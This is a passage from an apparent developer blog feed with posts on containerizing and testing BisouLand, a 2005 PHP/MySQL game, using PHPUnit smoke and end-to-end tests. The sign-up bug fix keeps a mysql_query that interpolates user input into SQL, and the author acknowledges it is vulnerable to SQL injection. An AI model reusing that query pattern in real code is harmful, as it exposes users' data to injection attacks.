        return [
            ['usr', 'password', 'username too short (&lt; 4 characters)'],
            ['test_sign_up02__', 'password', 'username too long (&gt; 15 characters)'],
            ['test_sign_up03!', 'password', 'username contains special characters (non alpha-numerical, not an underscore (`_`))'],
            ['test_sign_up05', 'pass', 'password too short (&lt; 5 characters)'],
            ['test_sign_up06', 'passwordthatistoolong', 'password too long (&gt; 15 characters)'],
            ['test_sign_up07', 'password!', 'password contains special characters (non alpha-numerical, not an underscore (`_`))'],
            ['BisouLand', 'password', 'system account, for notifications'],
        ];
    }

    #[TestDox('It prevents usernames that are already used')]
    public function test_it_prevents_usernames_that_are_already_used(): void
    {
        $httpClient = TestKernelSingleton::get()-&gt;httpClient();

        $username = 'BisouTest_';
        $password = 'password';
        $passwordConfirmation = $password;

        // First registration should succeed
        SignUpNewPlayer::run(
            $username,
            $password,
            $passwordConfirmation,
        );
        // Second registration should fail
        SignUpNewPlayer::run(
            $username,
            $password,
            $passwordConfirmation,
        );

        Assert::signedUpCount($username, 1);
    }

    public function test_it_prevents_passwords_that_do_not_match_confirmation(): void
    {
        $httpClient = TestKernelSingleton::get()-&gt;httpClient();

        $username = 'BisouTest';
        $password = 'password';
        $passwordConfirmation = 'different';

        SignUpNewPlayer::run(
            $username,
            $password,
            $passwordConfirmation
        );

        Assert::signedUpCount($username, 0);
    }
}
</code></pre>

<p>If I've read the long and nested if statements correctly,
this should cover all the different sign-up scenarios,
including username and password checking.</p>

<p>For now let's just run the "happy scenario" test to make sure it fails:</p>

<pre><code class="console">make test arg='--testdox --filter test_it_allows_visitors_to_become_players'
PHPUnit 12.3.2 by Sebastian Bergmann and contributors.

Runtime:       PHP 8.4.12
Configuration: /apps/qa/phpunit.xml.dist

F                                                                   1 / 1 (100%)

Time: 00:00.032, Memory: 18.00 MB

Sign Up (Bl\Qa\Tests\EndToEnd\SignUp)
 ‚úò It allows visitors to become players
   ‚îê
   ‚îú Failed asserting that Signed Up Count 0 is 1
   ‚îÇ
   ‚îÇ /apps/qa/tests/EndToEnd/Assertion/Assert.php:114
   ‚îÇ /apps/qa/tests/EndToEnd/SignUpTest.php:30
   ‚î¥

FAILURES!
Tests: 1, Assertions: 1, Failures: 1.
</code></pre>

<p>Brilliant! Before we fix it, I'll dive a bit more in the test details.</p>

<h2 id="test-data-cleanup">Test data cleanup</h2>

<p>I was surprised to find out that the username <code>BisouLand</code> was forbidden,
turns out it is used to send system notifications
(though I note that the checks are case sensitive only).</p>

<p>This is actually what inspired me to use <code>BisouTest</code> as a special test username,
if you remember correctly in the <code>SignUpNewPlayer</code> scenario,
which we've reused from the Smoke Tests as we would have done the exact same logic,
we have the following:</p>

<pre><code class="php">        if ('BisouTest' === $username) {
            $username = substr('BisouTest_'.uniqid(), 0, 15);
        }
</code></pre>

<p>This makes sure that there will be no username duplicates.</p>

<p>One thing I didn't mention in my previous article was that I've setup a way
to cleanup the test data with the <code>DeleteAllTestPlayers</code> scenario:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Infrastructure\Scenario;

use Bl\Qa\Tests\Infrastructure\TestKernelSingleton;

final readonly class DeleteAllTestPlayers
{
    public static function run(): void
    {
        $pdo = TestKernelSingleton::get()-&gt;pdo();

        $pdo-&gt;query("DELETE FROM membres WHERE pseudo LIKE 'BisouTest%'");
    }
}
</code></pre>

<p>This is called by a PHPUnit subscriber for the <code>TestRunner\Finished</code> event:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Infrastructure\Subscriber;

use Bl\Qa\Tests\Infrastructure\Scenario\DeleteAllTestPlayers;
use PHPUnit\Event\TestRunner\Finished;
use PHPUnit\Event\TestRunner\FinishedSubscriber;

final readonly class TestCleanupSubscriber implements FinishedSubscriber
{
    public function notify(Finished $event): void
    {
        DeleteAllTestPlayers::run();
    }
}
</code></pre>

<p>This will be called once the testsuite is finished executing,
but only if we register the subscriber in a PHPUnit Extension:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Infrastructure\Subscriber;

use PHPUnit\Runner\Extension\Extension;
use PHPUnit\Runner\Extension\Facade;
use PHPUnit\Runner\Extension\ParameterCollection;
use PHPUnit\TextUI\Configuration\Configuration;

final readonly class TestCleanupExtension implements Extension
{
    public function bootstrap(Configuration $configuration, Facade $facade, ParameterCollection $parameters): void
    {
        $facade-&gt;registerSubscriber(new TestCleanupSubscriber());
    }
}
</code></pre>

<p>The extension also has to be registered in the <code>phpunit.xml</code> config:</p>

<pre><code class="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!-- https://phpunit.readthedocs.io/en/latest/configuration.html --&gt;
&lt;phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:noNamespaceSchemaLocation="vendor/phpunit/phpunit/phpunit.xsd"
         bootstrap="vendor/autoload.php"
         cacheDirectory=".phpunit.cache"
         executionOrder="depends,defects"
         shortenArraysForExportThreshold="10"
         requireCoverageMetadata="true"
         beStrictAboutCoverageMetadata="true"
         beStrictAboutOutputDuringTests="true"
         displayDetailsOnPhpunitDeprecations="true"
         colors="true"
         failOnPhpunitDeprecation="true"
         failOnRisky="true"
         failOnWarning="true"&gt;
    &lt;php&gt;
        &lt;ini name="display_errors" value="1" /&gt;
        &lt;ini name="error_reporting" value="-1" /&gt;
        &lt;env name="APP_ENV" value="test" force="true" /&gt;
        &lt;env name="SHELL_VERBOSITY" value="-1" /&gt;
    &lt;/php&gt;
    &lt;testsuites&gt;
        &lt;testsuite name="smoke"&gt;
            &lt;directory&gt;tests/Smoke&lt;/directory&gt;
        &lt;/testsuite&gt;
        &lt;testsuite name="end-to-end"&gt;
            &lt;directory&gt;tests/EndToEnd&lt;/directory&gt;
        &lt;/testsuite&gt;
    &lt;/testsuites&gt;

    &lt;extensions&gt;
        &lt;bootstrap class="Bl\Qa\Tests\Infrastructure\Subscriber\TestCleanupExtension"/&gt;
    &lt;/extensions&gt;

    &lt;source ignoreIndirectDeprecations="true" restrictNotices="true" restrictWarnings="true"&gt;
        &lt;include&gt;
            &lt;directory&gt;../monolith/web&lt;/directory&gt;
        &lt;/include&gt;
    &lt;/source&gt;
&lt;/phpunit&gt;
</code></pre>

<h2 id="custom-assertion">Custom Assertion</h2>

<p>I've created a <code>signedUpCount</code> custom assertion,
which will count in the database the number of records persisted for a given
username:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\EndToEnd\Assertion;

use Bl\Qa\Tests\Infrastructure\TestKernelSingleton;
use PHPUnit\Framework\Assert as PHPUnitAssert;

final readonly class Assert
{
    public static function signedUpCount(string $username, int $expectedCount): void
    {
        $pdo = TestKernelSingleton::get()-&gt;pdo();

        $stmt = $pdo-&gt;prepare('SELECT COUNT(*) FROM membres WHERE pseudo = :username');
        $stmt-&gt;execute([
            'username' =&gt; $username,
        ]);
        $actualCount = (int) $stmt-&gt;fetchColumn();

        PHPUnitAssert::assertSame(
            $expectedCount,
            $actualCount,
            "Failed asserting that Signed Up Count {$actualCount} is {$expectedCount}",
        );
    }
}
</code></pre>

<p>I think there's an argument to have had made two assertions
(eg <code>signedUpSuccessful</code> count = 1, and <code>signedUpFailed</code> count = 0),
but for now I'm happy with this.</p>

<h2 id="fixing-the-bug">Fixing the bug</h2>

<p>We're going to fix that bug by removing the ID field from the query:</p>

<pre><code class="php">mysql_query(
    'INSERT INTO membres (pseudo, mdp, confirmation, timestamp, lastconnect, amour)'
    ." VALUES ('{$pseudo}', '{$hmdp}', '1', ".time().', '.time().", '300')"
);
</code></pre>

<p>Let's see if the bug is fixed by running the one test:</p>

<pre><code class="console">make test arg='--testdox --filter test_it_allows_visitors_to_become_players'
PHPUnit 12.3.2 by Sebastian Bergmann and contributors.

Runtime:       PHP 8.4.12
Configuration: /apps/qa/phpunit.xml.dist

.                                                                   1 / 1 (100%)

Time: 00:00.018, Memory: 18.00 MB

Sign Up (Bl\Qa\Tests\EndToEnd\SignUp)
 ‚úî It allows visitors to become players

OK (1 test, 1 assertion)
</code></pre>

<p>So far so good, let's confirm by running all the tests:</p>

<pre><code class="console">make test
PHPUnit 12.3.2 by Sebastian Bergmann and contributors.

Runtime:       PHP 8.4.12
Configuration: /apps/qa/phpunit.xml.dist

.................................................                 49 / 49 (100%)

Time: 00:00.162, Memory: 18.00 MB

OK (49 tests, 49 assertions)
</code></pre>

<p>Excellent! All fixed!</p>

<h2 id="conclusion">Conclusion</h2>

<p>I believe there will be many more instances of this,
and given the success of this fix we can assume it's safe to apply to all instances.</p>

<p>But I know these <code>mysql_query</code> calls will be removed very soon:</p>

<ul>
<li>they are deprecated</li>
<li>the query used is vulnerable to SQL Injection</li>
</ul>

<p>The End to End tests we've written also allow us to refactor the code,
instead of a nested list we can for example make use of early returns.</p>

<p>But if I have to refactor that code, I want to do it right,
by first writing unit tests which will make a design model emerge,
and by creating an API so we can also have integration tests.</p>

<p>Once we have these, both the Smoke Tests and End to End tests can be removed.</p>

<p>So I'm going to leave this as is for now.</p>

<blockquote>
  <p>‚ÅâÔ∏è <em>What do you mean, "the code is ugly"??</em></p>
</blockquote>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 2: Smoke Tests]]></title>
            <link href="/2025/09/17/xl-2-smoke-tests.html"/>
            <updated>2025-09-17T00:00:00+01:00</updated>
            <id>/2025/09/17/xl-2-smoke-tests.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò The Quality Avenger emerges from the burning forges of Coding Standards,
  smelting the ores of Static Analysis into the moulds of Automated Testing. üî•</p>
</blockquote>

<p>In this series, we're dealing with BisouLand, an eXtreme Legacy application
(2005 LAMP spaghetti code base). So far, we have:</p>

<ol>
<li><a href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html">üêã got it to run in a local container</a></li>
</ol>

<p>This means we can access it (http://localhost:8080/) and manually check it.
Unfortunately looking at the <a href="https://github.com/pyricau/bisouland/tree/4.0.1">code</a>,
it's obvious we cannot launch it to production as is:</p>

<ul>
<li>Encoding Issues</li>
<li>Broken Authentication and Session Management</li>
<li>Cross-Site Scripting (XSS) Flaws</li>
<li>Injection Flaws, including SQL injection</li>
<li>Improper Error Handling</li>
<li>Non Compliance with GDPR requirements</li>
</ul>

<p>But how do we know we're not breaking anything when fixing these?
As things currently stand, we don't even know what features BisouLand has.</p>

<p>So, we're going to need to write tests, which will be today's second article focus.</p>

<ul>
<li><a href="#qa-app">QA app</a></li>
<li><a href="#smoke-tests">Smoke Tests</a></li>
<li><a href="#custom-assertions">Custom Assurance</a></li>
<li><a href="#scenarios">Scenarios</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="qa-app">QA app</h2>

<p>The first plan of action is to move the current app into the <code>./apps/monolith</code>
sub-folder, and to create a new QA one in <code>./apps/qa</code>.</p>

<p>This approach will allow us to isolate the legacy code from any tooling we might
need to bring it up to standards.</p>

<p>The QA application has the following tree directory:</p>

<pre><code>apps/qa/
‚îú‚îÄ‚îÄ composer.json
‚îú‚îÄ‚îÄ composer.lock
‚îú‚îÄ‚îÄ compose.yaml
‚îú‚îÄ‚îÄ Dockerfile
‚îú‚îÄ‚îÄ Makefile
‚îú‚îÄ‚îÄ phpstan-baseline.neon
‚îú‚îÄ‚îÄ phpstan.neon.dist
‚îú‚îÄ‚îÄ phpunit.xml.dist
‚îú‚îÄ‚îÄ README.md
‚îî‚îÄ‚îÄ tests/
</code></pre>

<p>As you can see, it has its own <code>Dockerfile</code>:</p>

<pre><code># syntax=docker/dockerfile:1

###
# PHP Dev Container
# Utility Tools: PHP, bash, Composer
###
FROM php:8.4-cli-alpine AS php_dev_container

# Composer environment variables:
# * default user is superuser (root), so allow them
# * put cache directory in a readable/writable location
# _Note_: When running `composer` in container, use `--no-cache` option
ENV COMPOSER_ALLOW_SUPERUSER=1 \
    COMPOSER_CACHE_DIR=/tmp/.composer/cache

# Install dependencies:
# * bash for shell access and scripting
# * zip for composer packages that use ZIP archives
# _Note (Alpine)_: `--no-cache` includes `--update` and keeps image size minimal
#
# Then install PHP extensions
#
# _Note (Hadolint)_: No version locking, since Alpine only ever provides one version
# hadolint ignore=DL3018
RUN apk add --update --no-cache \
        bash \
        libzip-dev \
        zip \
    &amp;&amp; docker-php-ext-install \
        bcmath \
        pdo \
        pdo_mysql \
        zip

# Copy Composer binary from composer image
# _Note (Hadolint)_: False positive as `COPY` works with images too
# See: https://github.com/hadolint/hadolint/issues/197#issuecomment-1016595425
# hadolint ignore=DL3022
COPY --from=composer:2 /usr/bin/composer /usr/bin/composer

WORKDIR /apps/qa

# Caching `composer install`, as long as composer.{json,lock} don't change.
COPY composer.json composer.lock ./
RUN composer install \
    --no-cache \
    --no-interaction \
    --no-plugins \
    --no-scripts \
    --optimize-autoloader

# Copy the remaining application files (excluding those listed in .dockerignore)
COPY . .
</code></pre>

<p>And <code>compose.yaml</code>:</p>

<pre><code class="yaml">name: skyswoon-qa

services:
  app:
    build: .
    command: php -S 0.0.0.0:8081
    volumes:
      # Mount current directory into container for QA tools and configs
      - .:/apps/qa
      # Mount the monolith source code for analysis
      - ../monolith:/apps/monolith
    networks:
      - default
      - skyswoon-monolith_default

networks:
  skyswoon-monolith_default:
    external: true
</code></pre>

<p>This allows us to have QA in its own container (with PHP 8.4),
but it can still communicate with the monolith container,
so we can issue curl requets or query the MySQL database.</p>

<p>It also allows access to the monolith source files,
so we can run toolings on them like phpstan, rector, PHP CS Fixer, etc.</p>

<h2 id="smoke-tests">Smoke Tests</h2>

<p>There are two kinds of tests that I hate
(this is coming from a Test Driven Development practitioner, btw!)
and one of them is Smoke Tests.</p>

<p>Those basically issue a curl request,
and only check the bare minimum such as the status code is <code>200</code>.</p>

<p>I don't like these because they are slow (remote requests),
unreliable (errors like form validation, page not found, etc will still return <code>200</code>),
and overall don't provide much value at all.</p>

<p>However in this specific case I still think Smoke Tests can help us,
notably to make a list of what pages the website has,
and also differentiate the ones that are public,
and the ones that should only be accessed by logged in players.</p>

<p>This will be valuable knowledge,
and once we have better test coverage <strong>we can get rid of those</strong>.</p>

<p>After manually navigating the website, checking the <code>pages.php</code> file,
and overall getting familiar with the app,
I've documented my findings in a data provider in the following Smoke Test,
which checks if all private pages are accessible to logged in players,
but not for logged out visitors:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Smoke;

use Bl\Qa\Tests\Infrastructure\Scenario\GetLoggedInPlayer;
use Bl\Qa\Tests\Infrastructure\TestKernelSingleton;
use Bl\Qa\Tests\Smoke\Assertion\Assert;
use PHPUnit\Framework\Attributes\CoversNothing;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Large;
use PHPUnit\Framework\Attributes\TestDox;
use PHPUnit\Framework\TestCase;

#[CoversNothing]
#[Large]
final class PlayerPagesTest extends TestCase
{
    #[TestDox('it blocks $pageName page (`$url`) for visitors')]
    #[DataProvider('playerPagesProvider')]
    public function test_it_blocks_player_page_for_visitors(string $url, string $pageName): void
    {
        $httpClient = TestKernelSingleton::get()-&gt;httpClient();

        $response = $httpClient-&gt;request('GET', $url);

        Assert::blocksPageForLoggedOutVisitors($response);
    }

    #[TestDox('it loads $pageName page (`$url`) for logged in players')]
    #[DataProvider('playerPagesProvider')]
    public function test_it_loads_player_page_for_logged_in_players(string $url, string $pageName): void
    {
        $httpClient = TestKernelSingleton::get()-&gt;httpClient();

        $loggedInPlayer = GetLoggedInPlayer::run();

        $response = $httpClient-&gt;request('GET', $url, [
            'headers' =&gt; [
                'Cookie' =&gt; $loggedInPlayer-&gt;sessionCookie,
            ],
        ]);

        Assert::loadsPageForLoggedInPlayers($response);
    }

    /**
     * @return array&lt;array{string, string}&gt;
     */
    public static function playerPagesProvider(): array
    {
        return [
            ['/connected.html', 'account'],
            ['/action.html', 'blow kisses'],
            ['/cerveau.html', 'brain'],
            ['/changepass.html', 'change password'],
            ['/nuage.html', 'clouds'],
            ['/yeux.html', 'eyes'],
            ['/boite.html', 'inbox'],
            ['/bisous.html', 'kisses'],
            ['/construction.html', 'organs'],
            ['/infos.html', 'reference'],
            ['/techno.html', 'techniques'],
            ['/lire.html', 'view message'],
        ];
    }
}
</code></pre>

<p>Running this test <em>should</em> output the following:</p>

<pre><code class="console">&gt; make test arg='--testdox --filter PlayerPages'
PHPUnit 12.3.2 by Sebastian Bergmann and contributors.

Runtime:       PHP 8.4.11
Configuration: /apps/qa/phpunit.xml.dist

........................                                          24 / 24 (100%)

Time: 00:00.606, Memory: 18.00 MB

Player Pages (Bl\Qa\Tests\Smoke\PlayerPages)
 ‚úî it blocks organs page (`/construction.html`) for visitors
 ‚úî it blocks account page (`/connected.html`) for visitors
 ‚úî it blocks reference page (`/infos.html`) for visitors
 ‚úî it blocks kisses page (`/bisous.html`) for visitors
 ‚úî it blocks brain page (`/cerveau.html`) for visitors
 ‚úî it blocks change¬∑password page (`/changepass.html`) for visitors
 ‚úî it blocks eyes page (`/yeux.html`) for visitors
 ‚úî it blocks view¬∑message page (`/lire.html`) for visitors
 ‚úî it blocks clouds page (`/nuage.html`) for visitors
 ‚úî it blocks inbox page (`/boite.html`) for visitors
 ‚úî it blocks techniques page (`/techno.html`) for visitors
 ‚úî it blocks blow¬∑kisses page (`/action.html`) for visitors
 ‚úî it loads view¬∑message page (`/lire.html`) for logged in players
 ‚úî it loads eyes page (`/yeux.html`) for logged in players
 ‚úî it loads brain page (`/cerveau.html`) for logged in players
 ‚úî it loads change¬∑password page (`/changepass.html`) for logged in players
 ‚úî it loads techniques page (`/techno.html`) for logged in players
 ‚úî it loads account page (`/connected.html`) for logged in players
 ‚úî it loads reference page (`/infos.html`) for logged in players
 ‚úî it loads inbox page (`/boite.html`) for logged in players
 ‚úî it loads kisses page (`/bisous.html`) for logged in players
 ‚úî it loads organs page (`/construction.html`) for logged in players
 ‚úî it loads clouds page (`/nuage.html`) for logged in players
 ‚úî it loads blow¬∑kisses page (`/action.html`) for logged in players

OK (24 tests, 24 assertions)
</code></pre>

<blockquote>
  <p><em>üîó Check</em>: <a href="/2025/07/31/phpunit-best-practices.html">PHPUnit Best Practices</a></p>
</blockquote>

<p>The test is structured as follow:</p>

<ol>
<li>get an instance of HttpClient through TestKernelSingleton</li>
<li>optionally run some setup scenario such as <code>SignUpNewPlayer</code>, <code>LogInPlayer</code>, etc</li>
<li>send the remote request, and get the HTTP response</li>
<li>check that the HTTP Response satisfies our expectations</li>
</ol>

<h2 id="custom-assertions">Custom Assertions</h2>

<p>To be able to see if a page is blocked for a non logged in visitor,
we cannot just rely on the HTTP Status (it will always be 200),
so we have to instead check for error messages contained in the page.</p>

<p>Through my search, I've discovered that various messages get displayed when a
logged out visitor tries to access a private page,
I've documented this in the following custom assertion:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Smoke\Assertion;

use PHPUnit\Framework\Assert as PHPUnitAssert;
use Symfony\Contracts\HttpClient\ResponseInterface;

final readonly class Assert
{
    private const array NOT_LOGGED_IN_MESSAGES = [
        // Warning: side bar contains `Tu n'es pas connect&amp;eacute;.`
        'standard' =&gt; 'es pas connect√© !!',
        'variant 1 (inbox)' =&gt; 'es pas connect&amp;eacute; !!',
        'variant 2 (kisses, organs, techniques, account)' =&gt; 'Veuillez vous connecter.',
        'variant 3 (reference)' =&gt; 'Erreur... et vouaip !! :D',
    ];

    public static function blocksPageForLoggedOutVisitors(ResponseInterface $response): void
    {
        $content = (string) $response-&gt;getContent();

        foreach (self::NOT_LOGGED_IN_MESSAGES as $message) {
            if (str_contains($content, $message)) {
                PHPUnitAssert::assertSame(200, $response-&gt;getStatusCode(), $content);

                return;
            }
        }

        PHPUnitAssert::fail('Failed asserting that Page is blocked for logged out visitors');
    }

    public static function loadsPageForLoggedInPlayers(ResponseInterface $response): void
    {
        $content = (string) $response-&gt;getContent();

        foreach (self::NOT_LOGGED_IN_MESSAGES as $message) {
            if (str_contains($content, $message)) {
                PHPUnitAssert::fail('Failed asserting that Page loads for logged in players');
            }
        }

        PHPUnitAssert::assertSame(200, $response-&gt;getStatusCode(), $content);
    }
}
</code></pre>

<h2 id="scenarios">Scenarios</h2>

<p>For some of our tests, we need to have a visitor to first sign up as a player,
which I've done through the following "Scenario" class:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Infrastructure\Scenario;

use Bl\Qa\Tests\Infrastructure\TestKernelSingleton;

final readonly class SignUpNewPlayer
{
    public static function run(
        string $username = 'BisouTest',
        string $password = 'password',
        string $passwordConfirmation = 'password',
    ): Player {
        $httpClient = TestKernelSingleton::get()-&gt;httpClient();

        if ('BisouTest' === $username) {
            $username = substr('BisouTest_'.uniqid(), 0, 15);
        }

        $httpClient-&gt;request('POST', '/inscription.html', [
            'body' =&gt; [
                'Ipseudo' =&gt; $username,
                'Imdp' =&gt; $password,
                'Imdp2' =&gt; $passwordConfirmation,
                'inscription' =&gt; "S'inscrire",
            ],
            'headers' =&gt; [
                'Content-Type' =&gt; 'application/x-www-form-urlencoded',
            ],
        ]);

        return new Player($username, $password);
    }
}
</code></pre>

<p>Here we do an HTTP request that will simulate posting the HTML form,
alternatives for this would have been doing a SQL query to directly
create the player in the database, but we risk missing other insertions
that might be required.</p>

<p>The advantage of the current approach is that it also smoke tests the signup form.</p>

<p>We also need the player to be logged in:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Infrastructure\Scenario;

use Bl\Qa\Tests\Infrastructure\TestKernelSingleton;
use Symfony\Component\HttpClient\Exception\RedirectionException;

final readonly class LogInPlayer
{
    public static function run(Player $player): string
    {
        $httpClient = TestKernelSingleton::get()-&gt;httpClient();

        try {
            $response = $httpClient-&gt;request('POST', '/redirect.php', [
                'body' =&gt; [
                    'pseudo' =&gt; $player-&gt;username,
                    'mdp' =&gt; $player-&gt;password,
                    'connexion' =&gt; 'Se connecter',
                ],
                'headers' =&gt; [
                    'Content-Type' =&gt; 'application/x-www-form-urlencoded',
                ],
                'max_redirects' =&gt; 0,
            ]);
        } catch (RedirectionException $e) { // @phpstan-ignore catch.neverThrown
            // With max_redirects=0, HttpClient throws an exception when we get a 302
            // This is expected on successful login
            $response = $e-&gt;getResponse();
        }

        $headers = $response-&gt;getHeaders(false);
        $cookies = $headers['set-cookie'] ?? $headers['Set-Cookie'] ?? [];
        foreach ($cookies as $cookie) {
            if (str_starts_with($cookie, 'PHPSESSID=')) {
                return $cookie;
            }
        }

        $content = $response-&gt;getContent(false);
        $allCookies = implode(', ', $cookies);

        throw new \RuntimeException("Login failed: PHPSESSID cookie not found. Cookies: [{$allCookies}], Content: {$content}");
    }
}
</code></pre>

<p>Similarly to the <code>SignUpNewPlayer</code> scenario,
<code>LogInPlayer</code> posts a HTTP request that simulates the log in form.</p>

<p>To be abe to then act as the logged in player, we need their Session Cookie string,
so we make sure to return it.</p>

<p>Finally the <code>GetLoggedInPlayer</code> scenario will sign up and login a player once,
and always return it to save us some overhead in the test suite:</p>

<pre><code class="php">&lt;?php

declare(strict_types=1);

namespace Bl\Qa\Tests\Infrastructure\Scenario;

final class GetLoggedInPlayer
{
    private static ?LoggedInPlayer $loggedInPlayer = null;

    public static function run(): LoggedInPlayer
    {
        if (null === self::$loggedInPlayer) {
            $player = SignUpNewPlayer::run();
            $sessionCookie = LogInPlayer::run($player);

            self::$loggedInPlayer = new LoggedInPlayer($player-&gt;username, $player-&gt;password, $sessionCookie);
        }

        return self::$loggedInPlayer;
    }
}
</code></pre>

<p>These scenarios will come in handy when we start writing other kinds of tests.</p>

<h2 id="conclusion">Conclusion</h2>

<blockquote>
  <p>üíª <strong>Source code</strong>:</p>
  
  <ul>
  <li><a href="https://github.com/pyricau/bisouland/tree/4.0.5">Before our changes</a></li>
  <li><a href="https://github.com/pyricau/bisouland/tree/4.0.6">After Smoke Tests</a></li>
  </ul>
</blockquote>

<p>Now we can type:</p>

<pre><code class="console">make test arg='--testdox --filter PlayerPages'
</code></pre>

<p>And get the list of all public and private pages.</p>

<blockquote>
  <p>‚ÅâÔ∏è <em>What do you mean, "tests are failing"??</em></p>
</blockquote>
]]></content>
        </entry>
            <entry>
            <title type="html"><![CDATA[eXtreme Legacy 1: Dockerizing a 2005 LAMP app]]></title>
            <link href="/2025/09/10/xl-1-dockerizing-2005-lamp-app.html"/>
            <updated>2025-09-10T00:00:00+01:00</updated>
            <id>/2025/09/10/xl-1-dockerizing-2005-lamp-app.html</id>
            <content type="html"><![CDATA[<blockquote>
  <p>ü§ò From the abyssal depths of forgotten servers,
  Docker the Void-Walker awakens to drag ancient LAMP stack from their tombs,
  wrapping them in the obsidian chains of containerization! üî•</p>
</blockquote>

<p>Back in 2005, I learned how to write Linux/Apache/MySQL/PHP websites thanks
to the Site du Zero (SdZ), which is now known as <a href="https://openclassrooms.com/en/">Open Classrooms</a>.</p>

<p>I also used to play a web-browser game, similar to <a href="https://fr.wikipedia.org/wiki/OGame">OGame</a>,
called BisouLand (SkySwoon). Turns out its creator also built it through SdZ tutorials!</p>

<p>Fast forward 20 years later (today),
I received a message on LinkedIn from a CTO asking me the following:</p>

<blockquote>
  <p>üí¨ "Are you willing to work with <strong>eXtreme Legacy</strong> code on occasion?"</p>
</blockquote>

<p>I wondered to myself: what is eXtreme Legacy code? And I immediately remembered BisouLand.</p>

<p>You see, back in 2011,
its creator had made it Open Source on github and made me code collaborator...</p>

<p>So I <em>do</em> have access to a 2005 LAMP stack website,
cobbled together by someone learning stuff on the go from the internet.</p>

<p>What would it take, in 2025, to get an eXtreme Legacy app up and running?</p>

<p>This is what we're going to find out in this series.</p>

<p>Today's first article is about getting it to run, at least locally.</p>

<ul>
<li><a href="#the-project">The Project</a></li>
<li><a href="#containerization">Containerisation</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="the-project">The Project</h2>

<p>The <a href="https://github.com/pyricau/bisouland/tree/v1">version 1</a> has the following tree directory:</p>

<pre><code>web/
‚îú‚îÄ‚îÄ .htaccess
‚îú‚îÄ‚îÄ checkConnect.php
‚îú‚îÄ‚îÄ deconnexion.php
‚îú‚îÄ‚îÄ favicon.ico
‚îú‚îÄ‚îÄ images/
‚îú‚îÄ‚îÄ includes/
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bisouStyle2.css
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ compteur.js
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ newbisouStyle2.css
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ prev.js
‚îú‚îÄ‚îÄ index.php
‚îú‚îÄ‚îÄ phpincludes/
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ accueil.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ action.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ aide.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ attaque.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bd.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bisous.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ confirmation.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ connected.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ connexion.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ erreur404.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ evo.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ fctIndex.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ nuage.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ...
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ pages.php
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ yeux.php
‚îî‚îÄ‚îÄ redirect.php
</code></pre>

<p>The <code>.htaccess</code> file contains URL rewrite rules for Apache:</p>

<pre><code>RewriteEngine on
RewriteRule (.+)\.confirmation\.html$ /index.php?page=confirmation&amp;id=$1
RewriteRule (.+)\.bisous\.html$ /index.php?page=bisous&amp;cancel=$1
RewriteRule (.+)\.(.+)\.nuage\.html$ /index.php?page=nuage&amp;saut=1&amp;sautnuage=$1&amp;sautposition=$2
RewriteRule (.+)\.nuage\.html$ /index.php?page=nuage&amp;nuage=$1
RewriteRule (.+)\.(.+)\.action\.html$ /index.php?page=action&amp;nuage=$1&amp;position=$2
RewriteRule (.+)\.(.+)\.yeux\.html$ /index.php?page=yeux&amp;Dnuage=$1&amp;Dpos=$2
RewriteRule (.+)\.html$ /index.php?page=$1
ErrorDocument 404 /erreur404.html
</code></pre>

<p>There are no Database schema, but a quick scan at the files will reveal the use
of MySQL, for example <code>web/phpincludes/bd.php</code>:</p>

<pre><code class="php">&lt;?php

function bd_connect() {
        mysql_pconnect("HOST", "USER", "PASSWORD");
        mysql_select_db("DATABASE");
}
</code></pre>

<p>As for the code architecture, the file <code>web/index.php</code> acts as a
front controller that displays the layout of the website, and then includes
a file from <code>web/phpincludes/</code> for the actual page content.</p>

<p>The HTML is mixed with the MySQL queries, session managemenet, game logic
and any other PHP code. Code and comments are written in French, and there are
several encoding issues.</p>

<p>Here's an extract from <code>web/index.php</code>:</p>

<pre><code class="php">&lt;?php

header('Content-type: text/html; charset=ISO-8859-1'); 

session_start();
ob_start();
include 'phpincludes/bd.php';
bd_connect();
include('phpincludes/fctIndex.php');

//Si la variable $_SESSION['logged'] n'existe pas, on la cr√©√©e, et on l'initialise a false
if (!isset($_SESSION['logged'])) $_SESSION['logged'] = false;

//Si on est pas connect√©.
if ($_SESSION['logged'] == false)
{
  $id=0;
  //On r√©cup√®re les cookies enregistr√©s chez l'utilisateurs, s'ils sont la.
